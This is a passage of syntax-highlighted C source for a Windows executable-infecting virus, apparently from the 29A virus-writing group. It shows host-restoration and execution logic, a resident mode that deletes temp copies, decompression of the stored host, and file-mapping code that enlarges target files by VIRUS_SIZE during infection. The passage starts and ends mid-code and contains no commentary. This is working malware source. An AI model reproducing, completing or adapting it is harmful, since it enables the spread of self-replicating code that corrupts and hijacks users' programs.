        </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HOST: Mutex exists!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">          </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HOST: Mutex doesn't exist!"</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">),</span><span class="sc0">
          </span><span class="sc9">#endif
</span><span class="sc0">          </span><span class="sc11">ExecTemp</span><span class="sc10">(</span><span class="sc11">TSR_COPY</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">GetEndOfPath</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HostName</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">ExecTemp</span><span class="sc10">(</span><span class="sc11">HOST_COPY</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc9">#else
</span><span class="sc0">    </span><span class="sc11">GetEndOfPath</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HostName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">ExecTemp</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc11">ExitCode</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#ifdef tsr
</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">ExecTemp</span><span class="sc10">(</span><span class="sc11">PROG_TYPE</span><span class="sc0"> </span><span class="sc11">ProgType</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">ExecTemp</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pSrc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCmdLine</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFindFile</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#ifdef compr
</span><span class="sc0">  </span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">DecomprOK</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc9">#ifdef tsr
</span><span class="sc0">  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">[(</span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc11">PDWORD</span><span class="sc10">)(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'*A92'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc11">PDWORD</span><span class="sc10">)(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'*.'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">hFindFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0">
          </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\x0'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">GetTempFileName</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sz29A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
      </span><span class="sc10">!(</span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">GetTempFileName</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sz29A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">))))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">TmpName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*--</span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc11">PDWORD</span><span class="sc10">)(</span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'EXE'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MoveFile</span><span class="sc10">(</span><span class="sc11">TmpName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">TmpName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\x0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">GetTempFileName</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sz29A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">HostName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
      </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">HostName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0">
        </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">OpenMapFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WRITE_ACCESS</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc9">#ifdef tsr
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">OldPtr2NewEXE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#ifndef compr
</span><span class="sc0">        </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">OldFileSize</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#else
</span><span class="sc0">        </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">        </span><span class="sc9">#if 0
</span><span class="sc0">        </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Host decoding is about to start.."</span><span class="sc10">,</span><span class="sc0">
                   </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">jq_decode</span><span class="sc10">(</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OldFileSize</span><span class="sc10">),</span><span class="sc0">
                      </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CipherTarget</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nComprSize</span><span class="sc10">),</span><span class="sc0">
                      </span><span class="sc11">nComprSize</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc11">ComprMem</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">OldFileSize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">CipherTarget</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">DecomprOK</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">          </span><span class="sc9">#if 1
</span><span class="sc0">          </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Decode error: File is corrupt!"</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc9">#endif
</span><span class="sc0">          </span><span class="sc9">#if 0
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Host decoded succesfully!"</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc9">#endif
</span><span class="sc0">          </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc9">#ifdef tsr
</span><span class="sc0">      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PPROG_TYPE</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">),</span><span class="sc0">
                 </span><span class="sc11">RawProgType</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc9">#ifndef compr
</span><span class="sc0">      </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">pMZ</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">CloseTruncFile</span><span class="sc10">(</span><span class="sc11">WRITE_ACCESS</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#else
</span><span class="sc0">      </span><span class="sc11">CloseUnmapFile</span><span class="sc10">(</span><span class="sc11">WRITE_ACCESS</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DecomprOK</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*++</span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">szCmdLine</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">LPTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc0">
                                                  </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">pSrc</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">szCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">pSrc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">StartupInfo</span><span class="sc10">.</span><span class="sc11">cb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">STARTUPINFO</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CreateProcess</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc11">CREATE_NEW_CONSOLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc10">&amp;</span><span class="sc11">StartupInfo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ProcessInfo</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc9">#ifdef tsr
</span><span class="sc0">          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">ProcessInfo</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">GetExitCodeProcess</span><span class="sc10">(</span><span class="sc11">ProcessInfo</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ExitCode</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">ProcessInfo</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">ProcessInfo</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc9">#ifdef tsr
</span><span class="sc0">          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">GlobalFree</span><span class="sc10">(</span><span class="sc11">szCmdLine</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc9">#ifdef compr
</span><span class="sc0">      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">OpenMapFile</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">FileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">WriteAccess</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc9">#ifndef compr
</span><span class="sc0">  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">NewFileSize</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc11">hHandle1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">FileName</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">WriteAccess</span><span class="sc0">
                          </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc0">
                          </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">hHandle2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">,</span><span class="sc0">
                               </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
                               </span><span class="sc11">WriteAccess</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">PAGE_READWRITE</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PAGE_READONLY</span><span class="sc10">,</span><span class="sc0">
                               </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                               </span><span class="sc9">#ifdef compr
</span><span class="sc0">                               </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                               </span><span class="sc9">#else
</span><span class="sc0">                               </span><span class="sc11">WriteAccess</span><span class="sc0">
                                 </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">NewFileSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
                                     </span><span class="sc10">(((</span><span class="sc11">_TgtVir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
                                         </span><span class="sc10">(</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x1FF</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0">
                                           </span><span class="sc10">-</span><span class="sc4">0x200</span><span class="sc10">)</span><span class="sc0">
                                         </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PE_HEADER_OFFSET</span><span class="sc10">)</span><span class="sc0">
                                       </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">SIZE_PAD</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0">
                                     </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">SIZE_PAD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SIZE_PAD</span><span class="sc0">
                                 </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                               </span><span class="sc9">#endif 
</span><span class="sc0">                               </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">hHandle2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">);</span><span class="sc0">
